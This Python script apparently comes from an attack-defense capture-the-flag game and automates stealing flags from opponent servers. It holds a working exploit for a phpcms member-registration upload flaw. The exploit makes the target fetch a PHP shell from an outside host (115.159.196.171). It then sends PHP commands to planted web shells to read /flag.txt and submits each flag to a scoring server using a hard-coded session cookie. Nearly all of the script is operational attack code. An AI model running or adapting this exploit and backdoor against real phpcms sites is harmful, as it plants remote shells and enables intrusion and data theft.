#!/usr/bin/env python
# coding:utf-8
import requests
import re
import time

req = None

TOKEN = ""
SUBMIT_URL = "http://192.168.80.1/lms/portal/sp/hz_flag.php"
SUBMIT_U = ""
SUBMIT_P = ""

URLS = ['172.20.101.103',
        '172.20.102.103',
        '172.20.103.103',
        # '172.20.104.103',
        '172.20.105.103',
        '172.20.106.103',
        '172.20.107.103',
        '172.20.108.103'
        ]

SHELLS = ["http://172.20.102.103/phpcms/uploadfile/2017/0520/20170520114246193.php",
          "http://172.20.102.103/phpcms/uploadfile/2017/0520/20170520114246193.php",
          "http://172.20.103.103/phpcms/uploadfile/2017/0520/20170520074437383.php",
          # "http://172.20.104.103/phpcms/uploadfile/2017/0520/20170520074438272.php",
          "http://172.20.105.103/phpcms/uploadfile/2017/0520/20170520114246624.php",
          "http://172.20.106.103/phpcms/uploadfile/2017/0520/20170520074438173.php",
          "http://172.20.107.103/phpcms/uploadfile/2017/0520/20170520114247898.php",
          "http://172.20.108.103/phpcms/uploadfile/2017/0520/20170520074438944.php"
          ]


def poc_eval_backdoor_getflag_1(shellurl):
    data = {
        "virink": "echo file_get_contents('/flag.txt');"
    }
    res = requests.post(shellurl, data=data, timeout=5)
    if res.status_code == 200:
        print res.content
        return res.content


def poc_phpcms_reg_shell(url):
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    data = {
        'siteid': '1',
        'modelid': '1',
        'username': 'test',
        'password': 'testxx',
        'email': 'test@test.com',
        'info[content]': '<img src=http://115.159.196.171/shell.txt?.php#.jpg>',
        'dosubmit': '1',
    }
    rep = requests.post(u, data=data)
    print(rep.content)
    shell = ''
    re_result = re.findall(r'&lt;img src=(.*)&gt', rep.content)
    if len(re_result):
        shell = re_result[0]
        return shell


def submit(flag, ip):
    headers = {
        "Cookie": "SSCSum=14; zlms-sid=uh8kbtd9jrki9ch4jo7qfnpnt0; webcs_test_cookie=lms_cookie_checker; lms_login_name=HZ9; PHPSESSID=jq11tlbp5kuvtk49h94r6b1ap2"
    }
    data = {
        "melee_flag": flag,
        "melee_ip": ip
    }
    res = requests.post(SUBMIT_URL, data=data, headers=headers, timeout=5)
    if res.status_code == 200:
        # print res.content
        html = res.content
        print html[-200:]
        if '您已提交过当前IP和FLAG' in html:
            print '您已提交过当前IP和FLAG'
        elif '恭喜您答对了' in html:
            print '恭喜您答对了'

if __name__ == '__main__':
    # while True:
    for shell in SHELLS:
        print shell
        try:
            flag = poc_eval_backdoor_getflag_1(shell)
            if flag:
                print flag
                flag = flag.strip().replace('\r', '').replace('\n', '')
                print shell[7:21], flag
                submit(flag, shell[7:21])
                time.sleep(15)
        except Exception, e:
            print e
            pass
        print 'Waiting...'
        # time.sleep(60 * 10)
